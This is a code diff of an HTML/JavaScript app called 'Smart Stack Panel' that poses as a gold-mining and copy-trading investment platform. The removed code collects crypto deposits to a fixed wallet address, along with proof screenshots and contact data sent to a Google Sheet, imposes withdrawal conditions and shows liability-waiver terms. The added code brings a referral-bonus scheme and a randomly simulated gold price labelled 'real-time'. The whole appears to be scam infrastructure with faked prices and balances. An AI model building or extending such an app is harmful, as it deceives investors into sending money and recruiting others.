@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Smart Stack</title>
+    <title>Smart Stack Panel</title>
     <style>
         * {
             box-sizing: border-box;
@@ -202,7 +202,7 @@
         .card {
             background: rgba(10, 25, 41, 0.85);
             backdrop-filter: blur(12px);
-            padding: 16px;
+            padding: 18px;
             border-radius: 14px;
             text-align: center;
             margin-bottom: 14px;
@@ -218,25 +218,10 @@
         }
         .card h1 {
             color: #fbbf24;
-            margin: 6px 0 8px 0;
+            margin: 6px 0 0 0;
             font-size: 34px;
             font-weight: 800;
             font-family: monospace;
-        }
-        
-        .btn-change-pair {
-            background: rgba(56, 189, 248, 0.15);
-            color: #38bdf8;
-            border: 1px solid #0284c7;
-            padding: 6px 14px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .btn-change-pair:active {
-            transform: scale(0.95);
         }
 
         /* Action Buttons */
@@ -362,10 +347,6 @@
             border-bottom: 1px solid #f1f5f9;
             font-size: 10.5px;
         }
-        .p-profit {
-            color: #16a34a;
-            font-weight: 800;
-        }
 
         /* Bottom Nav */
         .bottom-nav {
@@ -391,135 +372,45 @@
         .nav-tab:active { transform: scale(0.9); }
         .nav-tab.active { color: #38bdf8; font-weight: 700; }
 
-        .quote-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 10px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.08);
-            font-size: 13px;
-        }
-        .quote-symbol { font-weight: bold; color: #f8fafc; }
-        .quote-price { font-family: monospace; font-weight: bold; color: #10b981; }
-
-        .pair-option-btn {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 8px;
+        /* Referral Box Styling */
+        .ref-card {
             background: #1e293b;
-            color: #fff;
             border: 1px solid #334155;
-            border-radius: 8px;
-            font-weight: bold;
+            border-radius: 10px;
+            padding: 12px;
+            margin-bottom: 14px;
             text-align: left;
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            transition: background 0.2s;
         }
-        .pair-option-btn:active { background: #334155; }
-
-        /* Deposit Gateway Box Styling */
-        .network-badge {
-            display: inline-block;
-            background: rgba(245, 158, 11, 0.15);
-            color: #fbbf24;
-            border: 1px solid #f59e0b;
-            padding: 4px 8px;
-            border-radius: 6px;
-            font-size: 11px;
-            font-weight: 700;
-            margin-bottom: 8px;
-        }
-        .address-box-wrapper {
+        .ref-box-row {
             display: flex;
             align-items: center;
-            background: #1e293b;
-            border: 1px solid #334155;
+            background: #0f172a;
+            border: 1px solid #38bdf8;
             border-radius: 8px;
-            padding: 4px;
-            margin-bottom: 12px;
+            padding: 6px 10px;
+            margin-top: 6px;
         }
-        .address-text {
+        .ref-input-text {
             font-family: monospace;
-            font-size: 11px;
-            color: #38bdf8;
-            padding: 6px 8px;
-            word-break: break-all;
+            font-size: 12px;
+            color: #fbbf24;
             flex: 1;
-            text-align: left;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            font-weight: bold;
         }
+
         .copy-btn {
             background: #0284c7;
             color: white;
             border: none;
-            padding: 8px 12px;
+            padding: 6px 10px;
             border-radius: 6px;
             font-size: 11px;
             font-weight: bold;
             cursor: pointer;
             white-space: nowrap;
-        }
-        .warning-box {
-            background: rgba(239, 68, 68, 0.1);
-            border: 1px dashed #ef4444;
-            color: #fca5a5;
-            border-radius: 8px;
-            padding: 10px;
-            font-size: 10.5px;
-            line-height: 1.4;
-            margin-bottom: 12px;
-            text-align: left;
-        }
-
-        /* Rules & Terms Styling */
-        .rules-container {
-            text-align: left;
-            font-size: 11.5px;
-            color: #cbd5e1;
-            line-height: 1.6;
-            max-height: 70vh;
-            overflow-y: auto;
-            padding-right: 4px;
-        }
-        .rules-container h3 {
-            color: #38bdf8;
-            font-size: 13px;
-            margin: 14px 0 6px 0;
-            border-bottom: 1px solid #334155;
-            padding-bottom: 4px;
-        }
-        .rules-table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 10.5px;
-            margin-bottom: 12px;
-        }
-        .rules-table th {
-            background: #1e293b;
-            color: #fbbf24;
-            padding: 6px;
-            border: 1px solid #334155;
-            text-align: left;
-        }
-        .rules-table td {
-            padding: 6px;
-            border: 1px solid #334155;
-            color: #e2e8f0;
-        }
-
-        /* Mandatory Terms Popup Styling */
-        .terms-box {
-            background: #020617;
-            border: 1px solid #334155;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 10.5px;
-            color: #94a3b8;
-            text-align: justify;
-            max-height: 180px;
-            overflow-y: auto;
-            line-height: 1.5;
-            margin-bottom: 12px;
         }
 
         /* Animated Popup Modal */
@@ -562,7 +453,7 @@
 
 <!-- Top Yellow Running Ticker -->
 <div class="top-ticker">
-    <div class="ticker-text">🔥 WELCOME TO SMART STACK PANEL | 🚀 SPECIAL OFFER: DEPOSIT $200 AND GET AN INSTANT $5 BONUS IMMEDIATELY! LIMITED TIME OFFER! 🚀</div>
+    <div class="ticker-text">🔥 WELCOME TO SMART STACK PANEL | 🚀 REFER FRIENDS & GET $1 INSTANT BONUS + $0.01 PER MINE COMMISSION! 🚀</div>
 </div>
 
 <!-- Stars Animated Background -->
@@ -598,6 +489,10 @@
         <label>Phone Number</label>
         <input type="tel" id="reg-phone" class="input-control" placeholder="+92 300 0000000">
     </div>
+    <div class="input-group">
+        <label>Referral Code (Optional)</label>
+        <input type="text" id="reg-refcode" class="input-control" placeholder="e.g. REF12345">
+    </div>
 
     <button class="btn" onclick="handleRegistration()" style="margin-top: 10px;">Register & Access Panel</button>
 </div>
@@ -614,11 +509,10 @@
         </div>
     </div>
 
-    <!-- Active Asset Real-time Price Card -->
+    <!-- Active Asset Real-time Price Card (Pair Changing Removed) -->
     <div class="card">
         <p id="active-asset-title">GOLD (XAU/USD) REAL-TIME</p>
         <h1 id="active-asset-price">$4203.00</h1>
-        <button class="btn-change-pair" onclick="openPairSelectModal()">🔄 CHANGE PAIR</button>
     </div>
 
     <!-- Mining Action Section -->
@@ -677,9 +571,9 @@
     </div>
 </div>
 
-<!-- 4-Tab Bottom Navigation Bar -->
+<!-- 4-Tab Bottom Navigation Bar (Quotes replaced with Referrals) -->
 <div class="bottom-nav" id="bottom-navbar">
-    <div class="nav-tab" onclick="openQuotesModal()"><span style="font-size:16px;">📊</span><span>Quotes</span></div>
+    <div class="nav-tab" onclick="openReferralsModal()"><span style="font-size:16px;">👥</span><span>Referrals</span></div>
     <div class="nav-tab active" onclick="openNativeChartModal()"><span style="font-size:16px;">📈</span><span>Mine Chart</span></div>
     <div class="nav-tab" onclick="showPopup('📜 History Log', 'No deposit history confirmed yet.')"><span style="font-size:16px;">📜</span><span>History</span></div>
     <div class="nav-tab" onclick="openProfileModal()"><span style="font-size:16px;">👤</span><span>Profile</span></div>
@@ -690,75 +584,44 @@
     <div class="modal-content">
         <div id="modal-title" style="font-weight:700; margin-bottom:10px; color:#f8fafc; font-size:16px;">Notice</div>
         <div id="modal-body" style="font-size:12px; margin-bottom:18px; color:#94a3b8; white-space:pre-line; line-height:1.5;"></div>
-        <button class="btn" id="modal-close-btn" onclick="closePopup()" style="margin-bottom:0; padding:10px;">Cancel</button>
+        <button class="btn" id="modal-close-btn" onclick="closePopup()" style="margin-bottom:0; padding:10px;">Close</button>
     </div>
 </div>
 
 <script>
-    // 1. Google Sheets Web App Endpoint
+    // Google Sheets Web App Endpoint
     const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwkGl3ha8tMXPqyjg2P-73Qt1SyOkBpBzMc_J9IxfWp_8MsEzxXrMERGzZIuqcTdFVG/exec";
 
-    function sendToGoogleSheet(name, email, phone, action, amount = "-", txid = "-", screenshot = "No SS", status = "Pending Approval") {
+    function sendToGoogleSheet(name, email, phone, action, amount = "-", txid = "-", screenshot = "No SS", status = "Pending Approval", refCode = "-") {
         fetch(GOOGLE_SCRIPT_URL, {
             method: "POST",
             mode: "no-cors",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ name, email, phone, action, amount, txid, screenshot, status })
+            body: JSON.stringify({ name, email, phone, action, amount, txid, screenshot, status, refCode })
         });
     }
 
-    // Fast 2-Way Approval & Balance Polling Check ("OK" in Google Sheet Unlocks Dashboard)
-    async function checkApprovalStatus() {
-        if (!currentUser) return;
-        try {
-            const res = await fetch(`${GOOGLE_SCRIPT_URL}?email=${encodeURIComponent(currentUser.email)}&phone=${encodeURIComponent(currentUser.phone)}`);
-            const data = await res.json();
-            if (data && data.result === 'success') {
-                if (data.isApproved && data.depositAmount > 0) {
-                    let currentDep = parseFloat(localStorage.getItem('depositBal')) || 0;
-                    if (currentDep !== data.depositAmount) {
-                        localStorage.setItem('depositBal', data.depositAmount.toFixed(2));
-                        let curr = parseFloat(localStorage.getItem('currentBal')) || 0;
-                        if (curr === 0) {
-                            localStorage.setItem('currentBal', data.depositAmount.toFixed(2));
-                            localStorage.setItem('equityBal', data.depositAmount.toFixed(2));
-                        }
-                        localStorage.removeItem('depositPending');
-                        const depBtn = document.getElementById('deposit-btn');
-                        if (depBtn) {
-                            depBtn.innerText = "Add Funds";
-                            depBtn.style.background = "#059669";
-                        }
-                        loadSavedBalances();
-                    }
-                }
-            }
-        } catch(e) {}
+    // Auto Time Updates
+    function updateLiveTime() {
+        const now = new Date();
+        const timeStr = now.toLocaleTimeString();
+        const dateStr = now.toLocaleDateString('en-GB');
+        const liveElem = document.getElementById('live-datetime');
+        if (liveElem) liveElem.innerText = `${timeStr} | ${dateStr}`;
     }
-    setInterval(checkApprovalStatus, 6000);
+    setInterval(updateLiveTime, 1000);
+    updateLiveTime();
 
-    // Live Activity Heartbeat
-    let isHeartbeatRunning = false;
-    function sendHeartbeat(isActive) {
-        if (currentUser && !isHeartbeatRunning) {
-            isHeartbeatRunning = true;
-            sendToGoogleSheet(
-                currentUser.fname + " " + currentUser.lname,
-                currentUser.email,
-                currentUser.phone,
-                isActive ? "HEARTBEAT_ACTIVE" : "HEARTBEAT_OFFLINE",
-                "-", "-", "No SS", "Verified"
-            );
-            setTimeout(() => { isHeartbeatRunning = false; }, 2000);
-        }
-    }
+    // Auto Gold Price Fluctuation Simulation
+    let baseGoldPrice = 4203.00;
+    setInterval(() => {
+        let change = (Math.random() - 0.49) * 1.5;
+        baseGoldPrice += change;
+        const priceElem = document.getElementById('active-asset-price');
+        if (priceElem) priceElem.innerText = `$${baseGoldPrice.toFixed(2)}`;
+    }, 2000);
 
-    window.addEventListener('visibilitychange', () => {
-        sendHeartbeat(document.visibilityState === 'visible');
-    });
-    window.addEventListener('beforeunload', () => sendHeartbeat(false));
-
-    // 2. Star Particle Animations
+    // Particle Stars Background Logic
     const container = document.getElementById('stars-container');
     for (let i = 0; i < 40; i++) {
         const star = document.createElement('div');
@@ -771,20 +634,30 @@
         container.appendChild(star);
     }
 
-    // 3. User Authentication
+    // User Authentication & Local Storage State Management
     let currentUser = JSON.parse(localStorage.getItem('traderUser')) || null;
+
+    function generateReferralCode(email) {
+        let hash = 0;
+        for (let i = 0; i < email.length; i++) {
+            hash = email.charCodeAt(i) + ((hash << 5) - hash);
+        }
+        return 'REF' + Math.abs(hash).toString(16).toUpperCase().substring(0, 6);
+    }
 
     function checkAuth() {
         if (currentUser) {
             document.getElementById('auth-screen').style.display = 'none';
             document.getElementById('main-dashboard').style.display = 'block';
             document.getElementById('bottom-navbar').style.display = 'flex';
-            loadMiningHistory();
+            
+            if (!currentUser.refCode) {
+                currentUser.refCode = generateReferralCode(currentUser.email);
+                localStorage.setItem('traderUser', JSON.stringify(currentUser));
+            }
+            
             loadSavedBalances();
-            checkDepositStatus();
-            sendHeartbeat(true);
-            checkMandatoryTerms();
-            checkApprovalStatus();
+            loadMiningHistory();
         } else {
             document.getElementById('auth-screen').style.display = 'block';
             document.getElementById('main-dashboard').style.display = 'none';
@@ -792,15 +665,16 @@
         }
     }
 
-    function validatePakistaniPhone(phone) {
-        let clean = phone.replace(/[\s\-\(\)]/g, '');
-        const pkRegex = /^(?:\+92|0092|92|0)(3[0-4][0-9]|339)[0-9]{7}$/;
-        return pkRegex.test(clean);
-    }
+    function loadSavedBalances() {
+        let curr = parseFloat(localStorage.getItem('currentBal')) || 0.00;
+        let dep = parseFloat(localStorage.getItem('depositBal')) || 0.00;
+        let eq = parseFloat(localStorage.getItem('equityBal')) || curr;
+        let withDr = parseFloat(localStorage.getItem('withdrawalBal')) || 0.00;
 
-    function validateGmail(email) {
-        const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
-        return gmailRegex.test(email.toLowerCase());
+        document.getElementById('val-current').innerText = `$${curr.toFixed(2)}`;
+        document.getElementById('val-deposit').innerText = `$${dep.toFixed(2)}`;
+        document.getElementById('val-equity').innerText = `$${eq.toFixed(2)}`;
+        document.getElementById('val-withdrawal').innerText = `$${withDr.toFixed(2)}`;
     }
 
     function handleRegistration() {
@@ -808,38 +682,52 @@
         const lname = document.getElementById('reg-lname').value.trim();
         const email = document.getElementById('reg-email').value.trim().toLowerCase();
         const phone = document.getElementById('reg-phone').value.trim();
+        const enteredRefCode = document.getElementById('reg-refcode').value.trim().toUpperCase();
 
         if (!fname || !lname || !email || !phone) {
-            alert('Please fill in all fields to complete registration.');
-            return;
-        }
-
-        if (!validateGmail(email)) {
-            alert('Registration Failed: Invalid email format. Please use a valid address.');
-            return;
-        }
-
-        if (!validatePakistaniPhone(phone)) {
-            alert('Registration Failed: Invalid mobile number format. Please provide a standard 11-digit mobile number.');
+            alert('Please fill in all required fields to complete registration.');
             return;
         }
 
         let registeredUsers = JSON.parse(localStorage.getItem('registeredUsersList')) || [];
-        let emailExistsWithOtherPhone = registeredUsers.some(u => u.email === email && u.phone !== phone);
-        let phoneExistsWithOtherEmail = registeredUsers.some(u => u.phone === phone && u.email !== email);
-
-        if (emailExistsWithOtherPhone || phoneExistsWithOtherEmail) {
-            alert('Security Notice: Credentials already linked to an existing account.');
+        if (registeredUsers.some(u => u.email === email)) {
+            alert('Security Notice: Email already linked to an existing account.');
             return;
         }
 
-        if (!registeredUsers.some(u => u.email === email && u.phone === phone)) {
-            registeredUsers.push({ email, phone });
-            localStorage.setItem('registeredUsersList', JSON.stringify(registeredUsers));
+        let myRefCode = generateReferralCode(email);
+        let bonusAmount = 0.00;
+
+        // Referral Validation and Bonus Grant ($1 Instant Bonus)
+        let referrerEmail = null;
+        if (enteredRefCode) {
+            let referrer = registeredUsers.find(u => u.refCode === enteredRefCode);
+            if (referrer) {
+                referrerEmail = referrer.email;
+                bonusAmount = 1.00; // Instant Signup Bonus
+                
+                // Add $1 Bonus to Referrer
+                let referrerCurrentBal = parseFloat(localStorage.getItem(`currentBal_${referrer.email}`)) || 0.00;
+                localStorage.setItem(`currentBal_${referrer.email}`, (referrerCurrentBal + 1.00).toFixed(2));
+                
+                // Track Referred User List for Referrer
+                let referrersList = JSON.parse(localStorage.getItem(`referredUsers_${referrer.email}`)) || [];
+                referrersList.push({
+                    name: `${fname} ${lname}`,
+                    email: email,
+                    id: myRefCode,
+                    date: new Date().toLocaleDateString('en-GB'),
+                    commission: 1.00
+                });
+                localStorage.setItem(`referredUsers_${referrer.email}`, JSON.stringify(referrersList));
+            }
         }
 
-        sendToGoogleSheet(fname + " " + lname, email, phone, "SIGNUP", "$0.00", "-", "No SS", "Pending Approval");
+        // Save Current User Registration Data
+        registeredUsers.push({ fname, lname, email, phone, refCode: myRefCode });
+        localStorage.setItem('registeredUsersList', JSON.stringify(registeredUsers));
 
+        // Sync & Overlay Transition
         document.getElementById('auth-screen').style.display = 'none';
         const syncOverlay = document.getElementById('sync-overlay');
         const syncFill = document.getElementById('sync-fill');
@@ -855,600 +743,204 @@
             if (timeLeft <= 0) {
                 clearInterval(syncInterval);
                 syncOverlay.style.display = 'none';
-                currentUser = { fname, lname, email, phone, joined: new Date().toLocaleDateString('en-GB') };
+                
+                currentUser = { fname, lname, email, phone, refCode: myRefCode, referrer: referrerEmail };
                 localStorage.setItem('traderUser', JSON.stringify(currentUser));
+                
+                // Grant Instant Bonus to current user balance
+                localStorage.setItem('currentBal', bonusAmount.toFixed(2));
+                localStorage.setItem('equityBal', bonusAmount.toFixed(2));
+                
+                sendToGoogleSheet(`${fname} ${lname}`, email, phone, "SIGNUP", `$${bonusAmount.toFixed(2)}`, "-", "No SS", "Approved", enteredRefCode);
+                
                 checkAuth();
+                if(bonusAmount > 0) {
+                    showPopup("🎉 Welcome Bonus Unlocked!", "You received an instant $1.00 referral bonus for joining through a valid referral code!");
+                }
             }
         }, 1000);
     }
 
-    // 4. Mandatory Terms Popup
-    function checkMandatoryTerms() {
-        const termsDismissed = localStorage.getItem('smartStackTermsDismissed');
-        if (termsDismissed === 'true') return;
-
-        let termsHtml = `
-            <div style="text-align:left;">
-                <div class="terms-box">
-                    <b>LEGAL DISCLAIMER & RISK INDEMNIFICATION CLAUSE:</b><br><br>
-                    By engaging with the Smart Stack decentralized execution interface, the user irrevocably covenants and acknowledges that capital deployment, copy-trading allocation, and liquidity pool exposure are undertaken exclusively at the user’s sole volition and autonomous financial discretion. The user explicitly recognizes that high-frequency algorithmic arbitrage, derivative leverage, and synthetic market models encompass inherent systemic variances, slippage volatilities, and unforeseen liquidity contractions.
-                    <br><br>
-                    Consequently, Smart Stack, its architectural contributors, and platform facilitators are unconditionally held harmless and completely exempt from any compensatory liability, loss of principal capital, transaction delays, or opportunity deficiencies arising directly or indirectly from operational market exposure. The participant warrants full statutory responsibility for their autonomous capital actions and agrees to abide by immutable smart protocol rules.
-                </div>
-
-                <div style="display:flex; align-items:flex-start; gap:8px; margin-bottom:10px; text-align:left;">
-                    <input type="checkbox" id="term-agree-chk" onchange="toggleTermSubmitBtn()" style="margin-top:3px; cursor:pointer;">
-                    <label for="term-agree-chk" style="font-size:11px; color:#f8fafc; cursor:pointer; line-height:1.4;">
-                        I solemnly declare that I am depositing funds entirely at my own will, and I hold full self-responsibility for any capital exposure or outcomes.
-                    </label>
-                </div>
-
-                <div style="display:flex; align-items:center; gap:8px; margin-bottom:14px; text-align:left;">
-                    <input type="checkbox" id="term-dontshow-chk" style="cursor:pointer;">
-                    <label for="term-dontshow-chk" style="font-size:11px; color:#94a3b8; cursor:pointer;">Don't show this again</label>
-                </div>
-
-                <button class="btn" id="term-confirm-btn" disabled onclick="confirmTerms()" style="opacity:0.5; cursor:not-allowed; margin-bottom:0; background:#059669;">Acknowledge & Enter Terminal</button>
-            </div>
-        `;
-
-        showPopup('⚖️ Risk & Autonomous Liability Agreement', '');
-        document.getElementById('modal-body').innerHTML = termsHtml;
-        document.getElementById('modal-close-btn').style.display = 'none';
+    // Modal Popup Display Utilities
+    function showPopup(title, bodyHtml) {
+        document.getElementById('modal-title').innerText = title;
+        document.getElementById('modal-body').innerHTML = bodyHtml;
+        const m = document.getElementById('modal');
+        m.style.display = 'flex';
+        setTimeout(() => m.classList.add('active-modal'), 10);
     }
 
-    function toggleTermSubmitBtn() {
-        const chk = document.getElementById('term-agree-chk');
-        const btn = document.getElementById('term-confirm-btn');
-        if (chk.checked) {
-            btn.disabled = false;
-            btn.style.opacity = '1';
-            btn.style.cursor = 'pointer';
+    function closePopup() {
+        const m = document.getElementById('modal');
+        m.classList.remove('active-modal');
+        setTimeout(() => m.style.display = 'none', 250);
+    }
+
+    // Referrals Modal Logic
+    function openReferralsModal() {
+        let appDomain = window.location.href.split('?')[0];
+        let refLink = `${appDomain}?ref=${currentUser.refCode}`;
+        let myReferredUsers = JSON.parse(localStorage.getItem(`referredUsers_${currentUser.email}`)) || [];
+
+        let rowsHtml = "";
+        if (myReferredUsers.length === 0) {
+            rowsHtml = `<tr><td colspan="4" style="text-align:center; color:#94a3b8; padding:10px;">No referral commissions earned yet.</td></tr>`;
         } else {
-            btn.disabled = true;
-            btn.style.opacity = '0.5';
-            btn.style.cursor = 'not-allowed';
-        }
-    }
-
-    function confirmTerms() {
-        const dontShow = document.getElementById('term-dontshow-chk').checked;
-        if (dontShow) {
-            localStorage.setItem('smartStackTermsDismissed', 'true');
-        }
-        document.getElementById('modal-close-btn').style.display = 'block';
-        closePopup();
-    }
-
-    function openProfileModal() {
-        if (!currentUser) return;
-        let profileHtml = `
-            <div style="text-align:left; font-size:12px; line-height:1.8;">
-                <div style="display:flex; justify-content:space-between; border-bottom:1px solid #334155; padding:6px 0;"><span style="color:#94a3b8;">Full Name:</span><span style="color:#fff; font-weight:bold;">${currentUser.fname} ${currentUser.lname}</span></div>
-                <div style="display:flex; justify-content:space-between; border-bottom:1px solid #334155; padding:6px 0;"><span style="color:#94a3b8;">Email:</span><span style="color:#fff; font-weight:bold;">${currentUser.email}</span></div>
-                <div style="display:flex; justify-content:space-between; border-bottom:1px solid #334155; padding:6px 0;"><span style="color:#94a3b8;">Phone:</span><span style="color:#fff; font-weight:bold;">${currentUser.phone}</span></div>
-                <div style="display:flex; justify-content:space-between; border-bottom:1px solid #334155; padding:6px 0;"><span style="color:#10b981; font-weight:bold;">Verified Trader</span></div>
-            </div>
-            <button class="btn" onclick="handleLogout()" style="background:#dc2626; margin-top:15px; margin-bottom:0;">Sign Out</button>
-        `;
-        showPopup('👤 User Profile', '');
-        document.getElementById('modal-body').innerHTML = profileHtml;
-    }
-
-    function handleLogout() {
-        sendHeartbeat(false);
-        localStorage.removeItem('traderUser');
-        currentUser = null;
-        closePopup();
-        checkAuth();
-    }
-
-    // 5. Deposit Management
-    const myDepositAddress = "0xfeff2067ef1a43aa4bca186f702b2669971debbd";
-
-    function checkDepositStatus() {
-        if (localStorage.getItem('depositPending') === 'true') {
-            const btn = document.getElementById('deposit-btn');
-            if (btn) {
-                btn.innerText = "Pending Approval...";
-                btn.style.background = "#d97706";
-            }
-        }
-    }
-
-    function copyAddress() {
-        navigator.clipboard.writeText(myDepositAddress).then(() => {
-            const copyBtn = document.getElementById('copy-addr-btn');
-            if (copyBtn) {
-                copyBtn.innerText = "Copied! ✓";
-                setTimeout(() => { copyBtn.innerText = "📋 Copy"; }, 2000);
-            }
-        });
-    }
-
-    function openDepositModal() {
-        if (localStorage.getItem('depositPending') === 'true') {
-            showPopup('⚠️ Request Pending', 'Your deposit transaction proof is currently under review by Admin. Please wait for official approval.');
-            return;
-        }
-
-        let depositHtml = `
-            <div style="text-align:left; font-size:12px; color:#cbd5e1; line-height:1.5;">
-                <div style="text-align:left; margin-bottom:4px;">
-                    <span class="network-badge">Network: BNB Smart Chain (BEP20)</span>
-                </div>
-                <div class="address-box-wrapper">
-                    <div class="address-text">${myDepositAddress}</div>
-                    <button class="copy-btn" id="copy-addr-btn" onclick="copyAddress()">📋 Copy</button>
-                </div>
-
-                <div class="warning-box">
-                    ⚠️ <b>IMPORTANT WARNING:</b> Please confirm that you are sending funds strictly via the <b>BNB Smart Chain (BEP20)</b> network. We are strictly not responsible for funds sent to an incorrect network or address.
-                </div>
-
-                <div class="input-group" style="margin-bottom:10px;">
-                    <label>Deposit Amount ($) [Min $100]</label>
-                    <input type="number" id="dep-amount" min="100" class="input-control" placeholder="e.g. 100" style="padding:8px 10px;">
-                </div>
-
-                <div class="input-group" style="margin-bottom:10px;">
-                    <label>Transaction ID / Hash (TxID)</label>
-                    <input type="text" id="dep-txid" class="input-control" placeholder="Paste Transaction Hash here" style="padding:8px 10px;">
-                </div>
-
-                <div class="input-group" style="margin-bottom:14px;">
-                    <label>Payment Screenshot (Receipt)</label>
-                    <input type="file" id="dep-ss" accept="image/*" class="input-control" style="padding:6px; font-size:11px; background:#1e293b;">
-                </div>
-
-                <button class="btn" style="background:#059669; margin-bottom:0;" onclick="submitFullDeposit()">Submit Deposit Proof</button>
-            </div>
-        `;
-        showPopup('⚡ Deposit Funds (BEP20 Gateway)', '');
-        document.getElementById('modal-body').innerHTML = depositHtml;
-    }
-
-    function submitFullDeposit() {
-        const amountInput = document.getElementById('dep-amount').value.trim();
-        const txid = document.getElementById('dep-txid').value.trim();
-        const fileInput = document.getElementById('dep-ss');
-
-        const amount = parseFloat(amountInput);
-
-        if (!amountInput || isNaN(amount) || amount < 100) {
-            alert('Minimum deposit requirement is $100.00.');
-            return;
-        }
-
-        if (!txid) {
-            alert('Please provide the Transaction Hash (TxID).');
-            return;
-        }
-
-        if (!fileInput.files || fileInput.files.length === 0) {
-            alert('Please attach your payment screenshot (receipt).');
-            return;
-        }
-
-        const file = fileInput.files[0];
-        const reader = new FileReader();
-        reader.onload = function(e) {
-            const base64Screenshot = e.target.result;
-            if (currentUser) {
-                sendToGoogleSheet(
-                    currentUser.fname + " " + currentUser.lname,
-                    currentUser.email,
-                    currentUser.phone,
-                    "DEPOSIT_PROOF_SUBMITTED",
-                    "$" + amount.toFixed(2),
-                    txid,
-                    base64Screenshot,
-                    "Pending Approval"
-                );
-            }
-
-            localStorage.setItem('depositPending', 'true');
-            checkDepositStatus();
-            closePopup();
-            
-            setTimeout(() => {
-                showPopup('✅ Verification Submitted', `Your deposit proof of $${amount.toFixed(2)} on BNB Smart Chain (BEP20) has been submitted successfully.\n\nYour account balance and mining capability will be activated once verified by the Admin.`);
-            }, 300);
-        };
-        reader.readAsDataURL(file);
-    }
-
-    // 6. Withdrawal Logic (With Same Exchange Warning & Reset Mechanism)
-    function handleWithdrawalClick() {
-        let currentDeposit = parseFloat(localStorage.getItem('depositBal')) || 0.00;
-        let currentAmount = parseFloat(localStorage.getItem('currentBal')) || 0.00;
-
-        if (currentDeposit < 100.00 && currentAmount < 100.00) {
-            showPopup(
-                '⚠️ Withdrawal Requirement',
-                'Once you complete your $100 cycle, after that you can withdraw up to $50 minimum.'
-            );
-            return;
-        }
-
-        let withdrawHtml = `
-            <div style="text-align:left; font-size:12px; color:#cbd5e1; line-height:1.5;">
-                <div class="warning-box" style="border-color:#f59e0b; color:#fbbf24; background:rgba(245, 158, 11, 0.1);">
-                    ⚠️ <b>SECURITY PROTOCOL:</b> Withdrawal must be requested strictly to the <b>same Exchange / Wallet Address</b> used during your initial deposit. Transfers to mismatching addresses will be rejected.
-                </div>
-                <div class="input-group" style="margin-bottom:10px;">
-                    <label>Your Registered Deposit Wallet Address (BEP20)</label>
-                    <input type="text" id="wd-address" class="input-control" placeholder="0x..." style="padding:8px 10px;">
-                </div>
-                <div class="input-group" style="margin-bottom:14px;">
-                    <label>Withdraw Amount ($) [Min $50]</label>
-                    <input type="number" id="wd-amount" min="50" class="input-control" placeholder="e.g. 50" style="padding:8px 10px;">
-                </div>
-                <button class="btn" style="background:#d97706; margin-bottom:0;" onclick="submitWithdrawalRequest()">Submit Withdrawal Request</button>
-            </div>
-        `;
-        showPopup('💰 Withdraw Funds', '');
-        document.getElementById('modal-body').innerHTML = withdrawHtml;
-    }
-
-    function submitWithdrawalRequest() {
-        const addr = document.getElementById('wd-address').value.trim();
-        const amtInput = document.getElementById('wd-amount').value.trim();
-        const amt = parseFloat(amtInput);
-
-        let currentBal = parseFloat(localStorage.getItem('currentBal')) || 0.00;
-        let depositBal = parseFloat(localStorage.getItem('depositBal')) || 0.00;
-
-        if (!addr || isNaN(amt) || amt < 50) {
-            alert('Minimum withdrawal amount is $50.00 and valid BEP20 address is required.');
-            return;
-        }
-
-        if (currentBal - amt < depositBal && currentBal - amt < 0) {
-            alert('Insufficient balance. You cannot withdraw more than your available profits above base capital.');
-            return;
-        }
-
-        if (currentUser) {
-            sendToGoogleSheet(
-                currentUser.fname + " " + currentUser.lname,
-                currentUser.email,
-                currentUser.phone,
-                "WITHDRAWAL_REQUEST",
-                "$" + amt.toFixed(2),
-                addr,
-                "Withdrawal",
-                "Pending Approval"
-            );
-        }
-
-        // Reset Balance: Deduct withdrawal amount and reset back to baseline ($100.00 base)
-        let newCurrent = Math.max(depositBal, currentBal - amt);
-        let currentWd = parseFloat(localStorage.getItem('withdrawalBal')) || 0.00;
-        
-        localStorage.setItem('currentBal', newCurrent.toFixed(2));
-        localStorage.setItem('equityBal', newCurrent.toFixed(2));
-        localStorage.setItem('withdrawalBal', (currentWd + amt).toFixed(2));
-
-        loadSavedBalances();
-        closePopup();
-
-        setTimeout(() => {
-            showPopup('✅ Withdrawal Submitted', `Your withdrawal request of $${amt.toFixed(2)} has been submitted to Admin for processing.\n\nYour available trading balance has been reset to base deposit ($${newCurrent.toFixed(2)}).`);
-        }, 300);
-    }
-
-    // 7. Rules & Legal Modal System
-    function openRulesModal() {
-        let rulesHtml = `
-            <div class="rules-container">
-                <div style="text-align:center; font-weight:800; color:#fbbf24; font-size:13px; margin-bottom:8px;">
-                    SMART STAKE PANEL — TERMS, RULES & GUIDELINES
-                </div>
-                <p style="font-size:11px; margin-bottom:12px; color:#94a3b8;">
-                    Welcome to Smart Stake Panel. Please read the operational rules, deposit conditions, and profit-sharing guidelines carefully before participating.
-                </p>
-
-                <h3>1. Quick Overview & Key Highlights</h3>
-                <table class="rules-table">
-                    <tr><th>Feature</th><th>Details / Policy</th></tr>
-                    <tr><td><b>Minimum Initial Deposit</b></td><td>$100 (Activates the Smart Mining feature)</td></tr>
-                    <tr><td><b>Deposit Processing Time</b></td><td>Up to 6 Hours (Subject to blockchain & proof verification)</td></tr>
-                    <tr><td><b>Daily Returns Model</b></td><td>Dynamic & Market-Linked (Varies daily based on live trading)</td></tr>
-                    <tr><td><b>Minimum Regular Withdrawal</b></td><td>$50 (Applicable after the first full cycle completion)</td></tr>
-                    <tr><td><b>Withdrawal Processing Time</b></td><td>24 – 48 Hours</td></tr>
-                    <tr><td><b>Trading Mechanism</b></td><td>100% Real Copy-Trading / Asset Allocation</td></tr>
-                </table>
-
-                <h3>2. Deposit & Account Activation Rules</h3>
-                <ul style="padding-left:16px; margin:0 0 10px 0;">
